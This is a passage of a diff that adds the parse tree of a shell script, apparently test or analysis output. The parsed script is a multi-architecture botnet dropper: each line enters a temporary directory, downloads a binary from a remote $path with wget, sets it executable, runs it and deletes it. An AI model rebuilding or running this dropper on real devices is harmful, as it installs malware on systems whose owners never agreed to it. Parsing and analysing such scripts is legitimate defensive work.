+        OperatorNode(lineno=38, op='||', pos=(3633, 3635)),
+        CommandNode(lineno=38, pos=(3636, 3643), parts=[
+          WordNode(lineno=38, pos=(3636, 3638), word='cd'),
+          WordNode(lineno=38, pos=(3639, 3643), word='/mnt'),
+        ]),
+        OperatorNode(lineno=38, op='||', pos=(3644, 3646)),
+        CommandNode(lineno=38, pos=(3647, 3654), parts=[
+          WordNode(lineno=38, pos=(3647, 3649), word='cd'),
+          WordNode(lineno=38, pos=(3650, 3654), word='/var'),
+        ]),
+        OperatorNode(lineno=38, op=';', pos=(3654, 3655)),
+        CommandNode(lineno=38, pos=(3656, 3674), parts=[
+          WordNode(lineno=38, pos=(3656, 3660), word='wget'),
+          WordNode(lineno=38, pos=(3661, 3674), word='$path/$armv5l', parts=[
+            ParameterNode(lineno=38, pos=(3661, 3666), value='path'),
+            ParameterNode(lineno=38, pos=(3667, 3674), value='armv5l'),
+          ]),
+        ]),
+        OperatorNode(lineno=38, op=';', pos=(3674, 3675)),
+        CommandNode(lineno=38, pos=(3676, 3693), parts=[
+          WordNode(lineno=38, pos=(3676, 3681), word='chmod'),
+          WordNode(lineno=38, pos=(3682, 3685), word='777'),
+          WordNode(lineno=38, pos=(3686, 3693), word='$armv5l', parts=[
+            ParameterNode(lineno=38, pos=(3686, 3693), value='armv5l'),
+          ]),
+        ]),
+        OperatorNode(lineno=38, op=';', pos=(3693, 3694)),
+        CommandNode(lineno=38, pos=(3695, 3704), parts=[
+          WordNode(lineno=38, pos=(3695, 3704), word='./$armv5l', parts=[
+            ParameterNode(lineno=38, pos=(3697, 3704), value='armv5l'),
+          ]),
+        ]),
+        OperatorNode(lineno=38, op=';', pos=(3704, 3705)),
+        CommandNode(lineno=38, pos=(3706, 3720), parts=[
+          WordNode(lineno=38, pos=(3706, 3708), word='rm'),
+          WordNode(lineno=38, pos=(3709, 3712), word='-rf'),
+          WordNode(lineno=38, pos=(3713, 3720), word='$armv5l', parts=[
+            ParameterNode(lineno=38, pos=(3713, 3720), value='armv5l'),
+          ]),
+        ]),
+        OperatorNode(lineno=39, op='\n', pos=(3720, 3721)),
+        CommandNode(lineno=39, pos=(3721, 3728), parts=[
+          WordNode(lineno=39, pos=(3721, 3723), word='cd'),
+          WordNode(lineno=39, pos=(3724, 3728), word='/tmp'),
+        ]),
+        OperatorNode(lineno=39, op='||', pos=(3729, 3731)),
+        CommandNode(lineno=39, pos=(3732, 3743), parts=[
+          WordNode(lineno=39, pos=(3732, 3734), word='cd'),
+          WordNode(lineno=39, pos=(3735, 3743), word='/var/run'),
+        ]),
+        OperatorNode(lineno=39, op='||', pos=(3744, 3746)),
+        CommandNode(lineno=39, pos=(3747, 3758), parts=[
+          WordNode(lineno=39, pos=(3747, 3749), word='cd'),
+          WordNode(lineno=39, pos=(3750, 3758), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=39, op='||', pos=(3759, 3761)),
+        CommandNode(lineno=39, pos=(3762, 3769), parts=[
+          WordNode(lineno=39, pos=(3762, 3764), word='cd'),
+          WordNode(lineno=39, pos=(3765, 3769), word='/mnt'),
+        ]),
+        OperatorNode(lineno=39, op='||', pos=(3770, 3772)),
+        CommandNode(lineno=39, pos=(3773, 3780), parts=[
+          WordNode(lineno=39, pos=(3773, 3775), word='cd'),
+          WordNode(lineno=39, pos=(3776, 3780), word='/var'),
+        ]),
+        OperatorNode(lineno=39, op=';', pos=(3780, 3781)),
+        CommandNode(lineno=39, pos=(3782, 3800), parts=[
+          WordNode(lineno=39, pos=(3782, 3786), word='wget'),
+          WordNode(lineno=39, pos=(3787, 3800), word='$path/$armv6l', parts=[
+            ParameterNode(lineno=39, pos=(3787, 3792), value='path'),
+            ParameterNode(lineno=39, pos=(3793, 3800), value='armv6l'),
+          ]),
+        ]),
+        OperatorNode(lineno=39, op=';', pos=(3800, 3801)),
+        CommandNode(lineno=39, pos=(3802, 3819), parts=[
+          WordNode(lineno=39, pos=(3802, 3807), word='chmod'),
+          WordNode(lineno=39, pos=(3808, 3811), word='777'),
+          WordNode(lineno=39, pos=(3812, 3819), word='$armv6l', parts=[
+            ParameterNode(lineno=39, pos=(3812, 3819), value='armv6l'),
+          ]),
+        ]),
+        OperatorNode(lineno=39, op=';', pos=(3819, 3820)),
+        CommandNode(lineno=39, pos=(3821, 3830), parts=[
+          WordNode(lineno=39, pos=(3821, 3830), word='./$armv6l', parts=[
+            ParameterNode(lineno=39, pos=(3823, 3830), value='armv6l'),
+          ]),
+        ]),
+        OperatorNode(lineno=39, op=';', pos=(3830, 3831)),
+        CommandNode(lineno=39, pos=(3832, 3846), parts=[
+          WordNode(lineno=39, pos=(3832, 3834), word='rm'),
+          WordNode(lineno=39, pos=(3835, 3838), word='-rf'),
+          WordNode(lineno=39, pos=(3839, 3846), word='$armv6l', parts=[
+            ParameterNode(lineno=39, pos=(3839, 3846), value='armv6l'),
+          ]),
+        ]),
+        OperatorNode(lineno=40, op='\n', pos=(3846, 3847)),
+        CommandNode(lineno=40, pos=(3847, 3854), parts=[
+          WordNode(lineno=40, pos=(3847, 3849), word='cd'),
+          WordNode(lineno=40, pos=(3850, 3854), word='/tmp'),
+        ]),
+        OperatorNode(lineno=40, op='||', pos=(3855, 3857)),
+        CommandNode(lineno=40, pos=(3858, 3869), parts=[
+          WordNode(lineno=40, pos=(3858, 3860), word='cd'),
+          WordNode(lineno=40, pos=(3861, 3869), word='/var/run'),
+        ]),
+        OperatorNode(lineno=40, op='||', pos=(3870, 3872)),
+        CommandNode(lineno=40, pos=(3873, 3884), parts=[
+          WordNode(lineno=40, pos=(3873, 3875), word='cd'),
+          WordNode(lineno=40, pos=(3876, 3884), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=40, op='||', pos=(3885, 3887)),
+        CommandNode(lineno=40, pos=(3888, 3895), parts=[
+          WordNode(lineno=40, pos=(3888, 3890), word='cd'),
+          WordNode(lineno=40, pos=(3891, 3895), word='/mnt'),
+        ]),
+        OperatorNode(lineno=40, op='||', pos=(3896, 3898)),
+        CommandNode(lineno=40, pos=(3899, 3906), parts=[
+          WordNode(lineno=40, pos=(3899, 3901), word='cd'),
+          WordNode(lineno=40, pos=(3902, 3906), word='/var'),
+        ]),
+        OperatorNode(lineno=40, op=';', pos=(3906, 3907)),
+        CommandNode(lineno=40, pos=(3908, 3926), parts=[
+          WordNode(lineno=40, pos=(3908, 3912), word='wget'),
+          WordNode(lineno=40, pos=(3913, 3926), word='$path/$armv7l', parts=[
+            ParameterNode(lineno=40, pos=(3913, 3918), value='path'),
+            ParameterNode(lineno=40, pos=(3919, 3926), value='armv7l'),
+          ]),
+        ]),
+        OperatorNode(lineno=40, op=';', pos=(3926, 3927)),
+        CommandNode(lineno=40, pos=(3928, 3945), parts=[
+          WordNode(lineno=40, pos=(3928, 3933), word='chmod'),
+          WordNode(lineno=40, pos=(3934, 3937), word='777'),
+          WordNode(lineno=40, pos=(3938, 3945), word='$armv7l', parts=[
+            ParameterNode(lineno=40, pos=(3938, 3945), value='armv7l'),
+          ]),
+        ]),
+        OperatorNode(lineno=40, op=';', pos=(3945, 3946)),
+        CommandNode(lineno=40, pos=(3947, 3956), parts=[
+          WordNode(lineno=40, pos=(3947, 3956), word='./$armv7l', parts=[
+            ParameterNode(lineno=40, pos=(3949, 3956), value='armv7l'),
+          ]),
+        ]),
+        OperatorNode(lineno=40, op=';', pos=(3956, 3957)),
+        CommandNode(lineno=40, pos=(3958, 3972), parts=[
+          WordNode(lineno=40, pos=(3958, 3960), word='rm'),
+          WordNode(lineno=40, pos=(3961, 3964), word='-rf'),
+          WordNode(lineno=40, pos=(3965, 3972), word='$armv7l', parts=[
+            ParameterNode(lineno=40, pos=(3965, 3972), value='armv7l'),
+          ]),
+        ]),
+        OperatorNode(lineno=41, op='\n', pos=(3972, 3973)),
+        CommandNode(lineno=41, pos=(3973, 3980), parts=[
+          WordNode(lineno=41, pos=(3973, 3975), word='cd'),
+          WordNode(lineno=41, pos=(3976, 3980), word='/tmp'),
+        ]),
+        OperatorNode(lineno=41, op='||', pos=(3981, 3983)),
+        CommandNode(lineno=41, pos=(3984, 3995), parts=[
+          WordNode(lineno=41, pos=(3984, 3986), word='cd'),
+          WordNode(lineno=41, pos=(3987, 3995), word='/var/run'),
+        ]),
+        OperatorNode(lineno=41, op='||', pos=(3996, 3998)),
+        CommandNode(lineno=41, pos=(3999, 4010), parts=[
+          WordNode(lineno=41, pos=(3999, 4001), word='cd'),
+          WordNode(lineno=41, pos=(4002, 4010), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=41, op='||', pos=(4011, 4013)),
+        CommandNode(lineno=41, pos=(4014, 4021), parts=[
+          WordNode(lineno=41, pos=(4014, 4016), word='cd'),
+          WordNode(lineno=41, pos=(4017, 4021), word='/mnt'),
+        ]),
+        OperatorNode(lineno=41, op='||', pos=(4022, 4024)),
+        CommandNode(lineno=41, pos=(4025, 4032), parts=[
+          WordNode(lineno=41, pos=(4025, 4027), word='cd'),
+          WordNode(lineno=41, pos=(4028, 4032), word='/var'),
+        ]),
+        OperatorNode(lineno=41, op=';', pos=(4032, 4033)),
+        CommandNode(lineno=41, pos=(4034, 4050), parts=[
+          WordNode(lineno=41, pos=(4034, 4038), word='wget'),
+          WordNode(lineno=41, pos=(4039, 4050), word='$path/$i586', parts=[
+            ParameterNode(lineno=41, pos=(4039, 4044), value='path'),
+            ParameterNode(lineno=41, pos=(4045, 4050), value='i586'),
+          ]),
+        ]),
+        OperatorNode(lineno=41, op=';', pos=(4050, 4051)),
+        CommandNode(lineno=41, pos=(4052, 4067), parts=[
+          WordNode(lineno=41, pos=(4052, 4057), word='chmod'),
+          WordNode(lineno=41, pos=(4058, 4061), word='777'),
+          WordNode(lineno=41, pos=(4062, 4067), word='$i586', parts=[
+            ParameterNode(lineno=41, pos=(4062, 4067), value='i586'),
+          ]),
+        ]),
+        OperatorNode(lineno=41, op=';', pos=(4067, 4068)),
+        CommandNode(lineno=41, pos=(4069, 4076), parts=[
+          WordNode(lineno=41, pos=(4069, 4076), word='./$i586', parts=[
+            ParameterNode(lineno=41, pos=(4071, 4076), value='i586'),
+          ]),
+        ]),
+        OperatorNode(lineno=41, op=';', pos=(4076, 4077)),
+        CommandNode(lineno=41, pos=(4078, 4090), parts=[
+          WordNode(lineno=41, pos=(4078, 4080), word='rm'),
+          WordNode(lineno=41, pos=(4081, 4084), word='-rf'),
+          WordNode(lineno=41, pos=(4085, 4090), word='$i586', parts=[
+            ParameterNode(lineno=41, pos=(4085, 4090), value='i586'),
+          ]),
+        ]),
+        OperatorNode(lineno=42, op='\n', pos=(4090, 4091)),
+        CommandNode(lineno=42, pos=(4091, 4098), parts=[
+          WordNode(lineno=42, pos=(4091, 4093), word='cd'),
+          WordNode(lineno=42, pos=(4094, 4098), word='/tmp'),
+        ]),
+        OperatorNode(lineno=42, op='||', pos=(4099, 4101)),
+        CommandNode(lineno=42, pos=(4102, 4113), parts=[
+          WordNode(lineno=42, pos=(4102, 4104), word='cd'),
+          WordNode(lineno=42, pos=(4105, 4113), word='/var/run'),
+        ]),
+        OperatorNode(lineno=42, op='||', pos=(4114, 4116)),
+        CommandNode(lineno=42, pos=(4117, 4128), parts=[
+          WordNode(lineno=42, pos=(4117, 4119), word='cd'),
+          WordNode(lineno=42, pos=(4120, 4128), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=42, op='||', pos=(4129, 4131)),
+        CommandNode(lineno=42, pos=(4132, 4139), parts=[
+          WordNode(lineno=42, pos=(4132, 4134), word='cd'),
+          WordNode(lineno=42, pos=(4135, 4139), word='/mnt'),
+        ]),
+        OperatorNode(lineno=42, op='||', pos=(4140, 4142)),
+        CommandNode(lineno=42, pos=(4143, 4150), parts=[
+          WordNode(lineno=42, pos=(4143, 4145), word='cd'),
+          WordNode(lineno=42, pos=(4146, 4150), word='/var'),
+        ]),
+        OperatorNode(lineno=42, op=';', pos=(4150, 4151)),
+        CommandNode(lineno=42, pos=(4152, 4168), parts=[
+          WordNode(lineno=42, pos=(4152, 4156), word='wget'),
+          WordNode(lineno=42, pos=(4157, 4168), word='$path/$i686', parts=[
+            ParameterNode(lineno=42, pos=(4157, 4162), value='path'),
+            ParameterNode(lineno=42, pos=(4163, 4168), value='i686'),
+          ]),
+        ]),
+        OperatorNode(lineno=42, op=';', pos=(4168, 4169)),
+        CommandNode(lineno=42, pos=(4170, 4185), parts=[
+          WordNode(lineno=42, pos=(4170, 4175), word='chmod'),
+          WordNode(lineno=42, pos=(4176, 4179), word='777'),
+          WordNode(lineno=42, pos=(4180, 4185), word='$i686', parts=[
+            ParameterNode(lineno=42, pos=(4180, 4185), value='i686'),
+          ]),
+        ]),
+        OperatorNode(lineno=42, op=';', pos=(4185, 4186)),
+        CommandNode(lineno=42, pos=(4187, 4194), parts=[
+          WordNode(lineno=42, pos=(4187, 4194), word='./$i686', parts=[
+            ParameterNode(lineno=42, pos=(4189, 4194), value='i686'),
+          ]),
+        ]),
+        OperatorNode(lineno=42, op=';', pos=(4194, 4195)),
+        CommandNode(lineno=42, pos=(4196, 4208), parts=[
+          WordNode(lineno=42, pos=(4196, 4198), word='rm'),
+          WordNode(lineno=42, pos=(4199, 4202), word='-rf'),
+          WordNode(lineno=42, pos=(4203, 4208), word='$i686', parts=[
+            ParameterNode(lineno=42, pos=(4203, 4208), value='i686'),
+          ]),
+        ]),
+        OperatorNode(lineno=43, op='\n', pos=(4208, 4209)),
+        CommandNode(lineno=43, pos=(4209, 4216), parts=[
+          WordNode(lineno=43, pos=(4209, 4211), word='cd'),
+          WordNode(lineno=43, pos=(4212, 4216), word='/tmp'),
+        ]),
+        OperatorNode(lineno=43, op='||', pos=(4217, 4219)),
+        CommandNode(lineno=43, pos=(4220, 4231), parts=[
+          WordNode(lineno=43, pos=(4220, 4222), word='cd'),
+          WordNode(lineno=43, pos=(4223, 4231), word='/var/run'),
+        ]),
+        OperatorNode(lineno=43, op='||', pos=(4232, 4234)),
+        CommandNode(lineno=43, pos=(4235, 4246), parts=[
+          WordNode(lineno=43, pos=(4235, 4237), word='cd'),
+          WordNode(lineno=43, pos=(4238, 4246), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=43, op='||', pos=(4247, 4249)),
+        CommandNode(lineno=43, pos=(4250, 4257), parts=[
+          WordNode(lineno=43, pos=(4250, 4252), word='cd'),
+          WordNode(lineno=43, pos=(4253, 4257), word='/mnt'),
+        ]),
+        OperatorNode(lineno=43, op='||', pos=(4258, 4260)),
+        CommandNode(lineno=43, pos=(4261, 4268), parts=[
+          WordNode(lineno=43, pos=(4261, 4263), word='cd'),
+          WordNode(lineno=43, pos=(4264, 4268), word='/var'),
+        ]),
+        OperatorNode(lineno=43, op=';', pos=(4268, 4269)),
+        CommandNode(lineno=43, pos=(4270, 4286), parts=[
+          WordNode(lineno=43, pos=(4270, 4274), word='wget'),
+          WordNode(lineno=43, pos=(4275, 4286), word='$path/$m68k', parts=[
+            ParameterNode(lineno=43, pos=(4275, 4280), value='path'),
+            ParameterNode(lineno=43, pos=(4281, 4286), value='m68k'),
+          ]),
+        ]),
+        OperatorNode(lineno=43, op=';', pos=(4286, 4287)),
+        CommandNode(lineno=43, pos=(4288, 4303), parts=[
+          WordNode(lineno=43, pos=(4288, 4293), word='chmod'),
+          WordNode(lineno=43, pos=(4294, 4297), word='777'),
+          WordNode(lineno=43, pos=(4298, 4303), word='$m68k', parts=[
+            ParameterNode(lineno=43, pos=(4298, 4303), value='m68k'),
+          ]),
+        ]),
+        OperatorNode(lineno=43, op=';', pos=(4303, 4304)),
+        CommandNode(lineno=43, pos=(4305, 4312), parts=[
+          WordNode(lineno=43, pos=(4305, 4312), word='./$m68k', parts=[
+            ParameterNode(lineno=43, pos=(4307, 4312), value='m68k'),
+          ]),
+        ]),
+        OperatorNode(lineno=43, op=';', pos=(4312, 4313)),
+        CommandNode(lineno=43, pos=(4314, 4326), parts=[
+          WordNode(lineno=43, pos=(4314, 4316), word='rm'),
+          WordNode(lineno=43, pos=(4317, 4320), word='-rf'),
+          WordNode(lineno=43, pos=(4321, 4326), word='$m68k', parts=[
+            ParameterNode(lineno=43, pos=(4321, 4326), value='m68k'),
+          ]),
+        ]),
+        OperatorNode(lineno=44, op='\n', pos=(4326, 4327)),
+        CommandNode(lineno=44, pos=(4327, 4334), parts=[
+          WordNode(lineno=44, pos=(4327, 4329), word='cd'),
+          WordNode(lineno=44, pos=(4330, 4334), word='/tmp'),
+        ]),
+        OperatorNode(lineno=44, op='||', pos=(4335, 4337)),
+        CommandNode(lineno=44, pos=(4338, 4349), parts=[
+          WordNode(lineno=44, pos=(4338, 4340), word='cd'),
+          WordNode(lineno=44, pos=(4341, 4349), word='/var/run'),
+        ]),
+        OperatorNode(lineno=44, op='||', pos=(4350, 4352)),
+        CommandNode(lineno=44, pos=(4353, 4364), parts=[
+          WordNode(lineno=44, pos=(4353, 4355), word='cd'),
+          WordNode(lineno=44, pos=(4356, 4364), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=44, op='||', pos=(4365, 4367)),
+        CommandNode(lineno=44, pos=(4368, 4375), parts=[
+          WordNode(lineno=44, pos=(4368, 4370), word='cd'),
+          WordNode(lineno=44, pos=(4371, 4375), word='/mnt'),
+        ]),
+        OperatorNode(lineno=44, op='||', pos=(4376, 4378)),
+        CommandNode(lineno=44, pos=(4379, 4386), parts=[
+          WordNode(lineno=44, pos=(4379, 4381), word='cd'),
+          WordNode(lineno=44, pos=(4382, 4386), word='/var'),
+        ]),
+        OperatorNode(lineno=44, op=';', pos=(4386, 4387)),
+        CommandNode(lineno=44, pos=(4388, 4403), parts=[
+          WordNode(lineno=44, pos=(4388, 4392), word='wget'),
+          WordNode(lineno=44, pos=(4393, 4403), word='$path/$sh4', parts=[
+            ParameterNode(lineno=44, pos=(4393, 4398), value='path'),
+            ParameterNode(lineno=44, pos=(4399, 4403), value='sh4'),
+          ]),
+        ]),
+        OperatorNode(lineno=44, op=';', pos=(4403, 4404)),
+        CommandNode(lineno=44, pos=(4405, 4419), parts=[
+          WordNode(lineno=44, pos=(4405, 4410), word='chmod'),
+          WordNode(lineno=44, pos=(4411, 4414), word='777'),
+          WordNode(lineno=44, pos=(4415, 4419), word='$sh4', parts=[
+            ParameterNode(lineno=44, pos=(4415, 4419), value='sh4'),
+          ]),
+        ]),
+        OperatorNode(lineno=44, op=';', pos=(4419, 4420)),
+        CommandNode(lineno=44, pos=(4421, 4427), parts=[
+          WordNode(lineno=44, pos=(4421, 4427), word='./$sh4', parts=[
+            ParameterNode(lineno=44, pos=(4423, 4427), value='sh4'),
+          ]),
+        ]),
+        OperatorNode(lineno=44, op=';', pos=(4427, 4428)),
+        CommandNode(lineno=44, pos=(4429, 4440), parts=[
+          WordNode(lineno=44, pos=(4429, 4431), word='rm'),
+          WordNode(lineno=44, pos=(4432, 4435), word='-rf'),
+          WordNode(lineno=44, pos=(4436, 4440), word='$sh4', parts=[
+            ParameterNode(lineno=44, pos=(4436, 4440), value='sh4'),
+          ]),
+        ]),
+        OperatorNode(lineno=45, op='\n', pos=(4440, 4441)),
+        CommandNode(lineno=45, pos=(4441, 4448), parts=[
+          WordNode(lineno=45, pos=(4441, 4443), word='cd'),
+          WordNode(lineno=45, pos=(4444, 4448), word='/tmp'),
+        ]),
+        OperatorNode(lineno=45, op='||', pos=(4449, 4451)),
+        CommandNode(lineno=45, pos=(4452, 4463), parts=[
+          WordNode(lineno=45, pos=(4452, 4454), word='cd'),
+          WordNode(lineno=45, pos=(4455, 4463), word='/var/run'),
+        ]),
+        OperatorNode(lineno=45, op='||', pos=(4464, 4466)),
+        CommandNode(lineno=45, pos=(4467, 4478), parts=[
+          WordNode(lineno=45, pos=(4467, 4469), word='cd'),
+          WordNode(lineno=45, pos=(4470, 4478), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=45, op='||', pos=(4479, 4481)),
+        CommandNode(lineno=45, pos=(4482, 4489), parts=[
+          WordNode(lineno=45, pos=(4482, 4484), word='cd'),
+          WordNode(lineno=45, pos=(4485, 4489), word='/mnt'),
+        ]),
+        OperatorNode(lineno=45, op='||', pos=(4490, 4492)),
+        CommandNode(lineno=45, pos=(4493, 4500), parts=[
+          WordNode(lineno=45, pos=(4493, 4495), word='cd'),
+          WordNode(lineno=45, pos=(4496, 4500), word='/var'),
+        ]),
+        OperatorNode(lineno=45, op=';', pos=(4500, 4501)),
+        CommandNode(lineno=45, pos=(4502, 4521), parts=[
+          WordNode(lineno=45, pos=(4502, 4506), word='wget'),
+          WordNode(lineno=45, pos=(4507, 4521), word='$path/$powerpc', parts=[
+            ParameterNode(lineno=45, pos=(4507, 4512), value='path'),
+            ParameterNode(lineno=45, pos=(4513, 4521), value='powerpc'),
+          ]),
+        ]),
+        OperatorNode(lineno=45, op=';', pos=(4521, 4522)),
+        CommandNode(lineno=45, pos=(4523, 4541), parts=[
+          WordNode(lineno=45, pos=(4523, 4528), word='chmod'),
+          WordNode(lineno=45, pos=(4529, 4532), word='777'),
+          WordNode(lineno=45, pos=(4533, 4541), word='$powerpc', parts=[
+            ParameterNode(lineno=45, pos=(4533, 4541), value='powerpc'),
+          ]),
+        ]),
+        OperatorNode(lineno=45, op=';', pos=(4541, 4542)),
+        CommandNode(lineno=45, pos=(4543, 4553), parts=[
+          WordNode(lineno=45, pos=(4543, 4553), word='./$powerpc', parts=[
+            ParameterNode(lineno=45, pos=(4545, 4553), value='powerpc'),
+          ]),
+        ]),
+        OperatorNode(lineno=45, op=';', pos=(4553, 4554)),
+        CommandNode(lineno=45, pos=(4555, 4570), parts=[
+          WordNode(lineno=45, pos=(4555, 4557), word='rm'),
+          WordNode(lineno=45, pos=(4558, 4561), word='-rf'),
+          WordNode(lineno=45, pos=(4562, 4570), word='$powerpc', parts=[
+            ParameterNode(lineno=45, pos=(4562, 4570), value='powerpc'),
+          ]),
+        ]),
+        OperatorNode(lineno=46, op='\n', pos=(4570, 4571)),
+        CommandNode(lineno=46, pos=(4571, 4578), parts=[
+          WordNode(lineno=46, pos=(4571, 4573), word='cd'),
+          WordNode(lineno=46, pos=(4574, 4578), word='/tmp'),
+        ]),
+        OperatorNode(lineno=46, op='||', pos=(4579, 4581)),
+        CommandNode(lineno=46, pos=(4582, 4593), parts=[
+          WordNode(lineno=46, pos=(4582, 4584), word='cd'),
+          WordNode(lineno=46, pos=(4585, 4593), word='/var/run'),
+        ]),
+        OperatorNode(lineno=46, op='||', pos=(4594, 4596)),
+        CommandNode(lineno=46, pos=(4597, 4608), parts=[
+          WordNode(lineno=46, pos=(4597, 4599), word='cd'),
+          WordNode(lineno=46, pos=(4600, 4608), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=46, op='||', pos=(4609, 4611)),
+        CommandNode(lineno=46, pos=(4612, 4619), parts=[
+          WordNode(lineno=46, pos=(4612, 4614), word='cd'),
+          WordNode(lineno=46, pos=(4615, 4619), word='/mnt'),
+        ]),
+        OperatorNode(lineno=46, op='||', pos=(4620, 4622)),
+        CommandNode(lineno=46, pos=(4623, 4630), parts=[
+          WordNode(lineno=46, pos=(4623, 4625), word='cd'),
+          WordNode(lineno=46, pos=(4626, 4630), word='/var'),
+        ]),
+        OperatorNode(lineno=46, op=';', pos=(4630, 4631)),
+        CommandNode(lineno=46, pos=(4632, 4656), parts=[
+          WordNode(lineno=46, pos=(4632, 4636), word='wget'),
+          WordNode(lineno=46, pos=(4637, 4656), word='$path/$powerpc440fp', parts=[
+            ParameterNode(lineno=46, pos=(4637, 4642), value='path'),
+            ParameterNode(lineno=46, pos=(4643, 4656), value='powerpc440fp'),
+          ]),
+        ]),
+        OperatorNode(lineno=46, op=';', pos=(4656, 4657)),
+        CommandNode(lineno=46, pos=(4658, 4681), parts=[
+          WordNode(lineno=46, pos=(4658, 4663), word='chmod'),
+          WordNode(lineno=46, pos=(4664, 4667), word='777'),
+          WordNode(lineno=46, pos=(4668, 4681), word='$powerpc440fp', parts=[
+            ParameterNode(lineno=46, pos=(4668, 4681), value='powerpc440fp'),
+          ]),
+        ]),
+        OperatorNode(lineno=46, op=';', pos=(4681, 4682)),
+        CommandNode(lineno=46, pos=(4683, 4698), parts=[
+          WordNode(lineno=46, pos=(4683, 4698), word='./$powerpc440fp', parts=[
+            ParameterNode(lineno=46, pos=(4685, 4698), value='powerpc440fp'),
+          ]),
+        ]),
+        OperatorNode(lineno=46, op=';', pos=(4698, 4699)),
+        CommandNode(lineno=46, pos=(4700, 4720), parts=[
+          WordNode(lineno=46, pos=(4700, 4702), word='rm'),
+          WordNode(lineno=46, pos=(4703, 4706), word='-rf'),
+          WordNode(lineno=46, pos=(4707, 4720), word='$powerpc440fp', parts=[
+            ParameterNode(lineno=46, pos=(4707, 4720), value='powerpc440fp'),
+          ]),
+        ]),
+        OperatorNode(lineno=47, op='\n', pos=(4720, 4721)),
+        CommandNode(lineno=47, pos=(4721, 4728), parts=[
+          WordNode(lineno=47, pos=(4721, 4723), word='cd'),
+          WordNode(lineno=47, pos=(4724, 4728), word='/tmp'),
+        ]),
+        OperatorNode(lineno=47, op='||', pos=(4729, 4731)),
+        CommandNode(lineno=47, pos=(4732, 4743), parts=[
+          WordNode(lineno=47, pos=(4732, 4734), word='cd'),
+          WordNode(lineno=47, pos=(4735, 4743), word='/var/run'),
+        ]),
+        OperatorNode(lineno=47, op='||', pos=(4744, 4746)),
+        CommandNode(lineno=47, pos=(4747, 4758), parts=[
+          WordNode(lineno=47, pos=(4747, 4749), word='cd'),
+          WordNode(lineno=47, pos=(4750, 4758), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=47, op='||', pos=(4759, 4761)),
+        CommandNode(lineno=47, pos=(4762, 4769), parts=[
+          WordNode(lineno=47, pos=(4762, 4764), word='cd'),
+          WordNode(lineno=47, pos=(4765, 4769), word='/mnt'),
+        ]),
+        OperatorNode(lineno=47, op='||', pos=(4770, 4772)),
+        CommandNode(lineno=47, pos=(4773, 4780), parts=[
+          WordNode(lineno=47, pos=(4773, 4775), word='cd'),
+          WordNode(lineno=47, pos=(4776, 4780), word='/var'),
+        ]),
+        OperatorNode(lineno=47, op=';', pos=(4780, 4781)),
+        CommandNode(lineno=47, pos=(4782, 4800), parts=[
+          WordNode(lineno=47, pos=(4782, 4786), word='wget'),
+          WordNode(lineno=47, pos=(4787, 4800), word='$path/$x86_64', parts=[
+            ParameterNode(lineno=47, pos=(4787, 4792), value='path'),
+            ParameterNode(lineno=47, pos=(4793, 4800), value='x86_64'),
+          ]),
+        ]),
+        OperatorNode(lineno=47, op=';', pos=(4800, 4801)),
+        CommandNode(lineno=47, pos=(4802, 4819), parts=[
+          WordNode(lineno=47, pos=(4802, 4807), word='chmod'),
+          WordNode(lineno=47, pos=(4808, 4811), word='777'),
+          WordNode(lineno=47, pos=(4812, 4819), word='$x86_64', parts=[
+            ParameterNode(lineno=47, pos=(4812, 4819), value='x86_64'),
+          ]),
+        ]),
+        OperatorNode(lineno=47, op=';', pos=(4819, 4820)),
+        CommandNode(lineno=47, pos=(4821, 4830), parts=[
+          WordNode(lineno=47, pos=(4821, 4830), word='./$x86_64', parts=[
+            ParameterNode(lineno=47, pos=(4823, 4830), value='x86_64'),
+          ]),
+        ]),
+        OperatorNode(lineno=47, op=';', pos=(4830, 4831)),
+        CommandNode(lineno=47, pos=(4832, 4846), parts=[
+          WordNode(lineno=47, pos=(4832, 4834), word='rm'),
+          WordNode(lineno=47, pos=(4835, 4838), word='-rf'),
+          WordNode(lineno=47, pos=(4839, 4846), word='$x86_64', parts=[
+            ParameterNode(lineno=47, pos=(4839, 4846), value='x86_64'),
+          ]),
+        ]),
+        OperatorNode(lineno=48, op='\n', pos=(4846, 4847)),
+      ]),
+    ReservedwordNode(lineno=48, pos=(4847, 4849), word='fi'),
+  ]),
+], pos=(339, 4849))
